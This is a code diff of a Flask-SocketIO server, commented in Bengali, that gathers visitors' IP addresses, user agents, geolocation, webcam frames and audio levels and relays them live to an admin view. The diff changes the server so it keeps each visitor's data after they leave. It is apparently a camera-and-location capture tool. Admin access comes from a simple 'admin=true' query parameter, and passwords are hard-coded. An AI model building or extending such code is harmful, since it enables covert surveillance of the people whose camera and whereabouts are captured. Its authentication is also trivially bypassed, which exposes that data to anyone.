@@ -8,8 +8,9 @@ bp = Blueprint('random_route', __name__, url_prefix='/random')
 ADMIN_PASSWORD = 'admin123'
 CLEAR_PASSWORD = 'arif123'
 
-clients = {}        # key = IP, value = {id, ip, ua, location, frame, audio, sids}
-admin_sids = set()  # admin-এর socket ids (কুয়েরি প্যারামিটার দিয়ে চিহ্নিত)
+# ক্লায়েন্ট ডেটা: key = IP, value = {id, ip, ua, location, frame, audio, sids, offline}
+clients = {}
+admin_sids = set()   # এডমিন সকেট আইডি
 
 @bp.route('/')
 def index():
@@ -38,13 +39,12 @@ def admin_logout():
 # ========== Socket.IO ইভেন্ট ==========
 @socketio.on('connect')
 def handle_connect():
-    # কুয়েরি প্যারামিটার থেকে admin চেক
     is_admin = request.args.get('admin', 'false').lower() == 'true'
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     ua = request.headers.get('User-Agent')
     
-    # ইউজার ডেটা মেইনটেইন (শুধু ইউজারদের জন্য, এডমিন নয়)
     if not is_admin:
+        # ইউজার কানেক্ট
         if ip not in clients:
             clients[ip] = {
                 'id': ip,
@@ -53,25 +53,29 @@ def handle_connect():
                 'location': None,
                 'last_frame': None,
                 'audio_level': 0,
-                'sids': [request.sid]
+                'sids': [request.sid],
+                'offline': False
             }
         else:
             if request.sid not in clients[ip]['sids']:
                 clients[ip]['sids'].append(request.sid)
+            clients[ip]['offline'] = False  # লাইভ হলে অফলাইন ফ্ল্যাগ রিমুভ
+        print(f"✅ User connected: {ip} (total: {len(clients)})")
     else:
-        # এডমিন সিডি সংরক্ষণ
         admin_sids.add(request.sid)
+        print(f"🛡️ Admin connected: {request.sid}")
         # এডমিনকে বর্তমান ডেটা পাঠাও
         emit('admin_update', clients, to=request.sid)
 
 @socketio.on('disconnect')
 def handle_disconnect():
-    # ইউজার ডেটা থেকে সিডি রিমুভ
+    # ইউজার ডিসকানেক্ট – কিন্তু IP ডিলিট করো না (অফলাইন ডেটা রাখতে)
     for ip, data in list(clients.items()):
         if request.sid in data['sids']:
             data['sids'].remove(request.sid)
             if not data['sids']:
-                del clients[ip]
+                data['offline'] = True
+                print(f"📴 User {ip} went offline (all sids gone)")
             break
     # এডমিন সিডি রিমুভ
     if request.sid in admin_sids:
@@ -79,10 +83,11 @@ def handle_disconnect():
     # এডমিনদের আপডেট পাঠাও
     if admin_sids:
         emit('admin_update', clients, to=list(admin_sids))
+    print(f"📴 Disconnect, active clients: {len(clients)}")
 
 @socketio.on('ready')
 def handle_ready():
-    # ইউজার পারমিশন দিলে কিছু করার দরকার নেই
+    # ইউজার পারমিশন দিলে কিছু না
     pass
 
 @socketio.on('location_update')
@@ -90,8 +95,10 @@ def handle_location(data):
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     if ip in clients:
         clients[ip]['location'] = data
+        clients[ip]['offline'] = False
         if admin_sids:
             emit('admin_update', clients, to=list(admin_sids))
+        print(f"📍 Location update from {ip}")
 
 @socketio.on('video_frame')
 def handle_video(data):
@@ -99,20 +106,26 @@ def handle_video(data):
     if ip in clients:
         clients[ip]['last_frame'] = data.get('image')
         clients[ip]['audio_level'] = data.get('audio_volume', 0)
+        clients[ip]['offline'] = False
         if admin_sids:
             emit('admin_update', clients, to=list(admin_sids))
+        # লগ (প্রতি ১০ম ফ্রেমে)
+        if not hasattr(handle_video, 'counter'):
+            handle_video.counter = 0
+        handle_video.counter += 1
+        if handle_video.counter % 10 == 0:
+            print(f"🎥 Video frame from {ip}, audio: {data.get('audio_volume',0)}%")
 
-# ========== ক্লিয়ার ডেটা ==========
+# ========== ক্লিয়ার ডেটা (শুধু এডমিন) ==========
 @socketio.on('clear_data')
 def handle_clear(data):
     password = data.get('password')
     if password == CLEAR_PASSWORD:
         clients.clear()
-        # সব ক্লায়েন্টকে (যারা ইউজার) clear_all পাঠাও
-        emit('clear_all', broadcast=True)
-        # এডমিনদের খালি ডেটা পাঠাও
+        emit('clear_all', broadcast=True)   # সব ক্লায়েন্টকে সিগন্যাল
         if admin_sids:
             emit('admin_update', clients, to=list(admin_sids))
+        print("🗑️ All data cleared")
         return {'status': 'ok'}
     else:
         return {'status': 'error', 'message': 'Wrong password'}
